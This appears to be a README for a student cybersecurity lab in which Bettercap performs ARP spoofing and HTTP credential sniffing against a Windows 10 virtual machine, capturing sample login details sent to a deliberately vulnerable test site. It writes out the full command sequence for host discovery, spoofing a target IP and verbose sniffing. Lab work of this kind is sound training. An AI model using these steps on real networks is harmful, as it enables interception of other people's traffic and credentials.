# network-sniffing-bettercap-lab
A cybersecurity lab project demonstrating Man-in-the-Middle (MITM) attack techniques using Bettercap. The project focuses on ARP spoofing, network traffic interception, and analysis of unencrypted HTTP credentials in a virtual environment.

 MITM Attack Simulation using Bettercap

 Lab Environment
 Attacker Machine: Kali Linux  
 Victim Machine: Windows 10  
 Network Mode: NAT (VMware)  
 Attacker Interface: ens33  
 Victim IP: 192.168.195.128  



Tools Used:
Bettercap  
ARP Spoofing Module  
Network Sniffing Module  
HTTP Test Website  


 Methodology

1. Network Discovery
net.probe on
net.show

2. Enable MITM (ARP Spoofing)
set arp.spoof.targets 192.168.195.128
arp.spoof on

3. Enable Packet Sniffing
set net.sniff.verbose true
net.sniff on

4. Victim Activity
From Windows 10:
Visited HTTP test site:
http://testphp.vulnweb.com/login.php
Entered sample credentials:

Username: admin
Password: 1234

Results
Captured credentials were visible in Bettercap console:
USERNAME = admin
PASSWORD = 1234

Screenshots:
1.Launch Bettercap on the network interface
bettercap  ens33

2.Discover active hosts on the network
net.probe on
net.show

3.Set the target and start ARP spoofing
set arp.spoof.targets 192.168.195.128
arp.spoof on

4.Enable verbose sniffing to capture credentials
set net.sniff.verbose true
net.sniff on

5.Credentials Captured
The sniffed HTTP POST request showing the intercepted username and password.


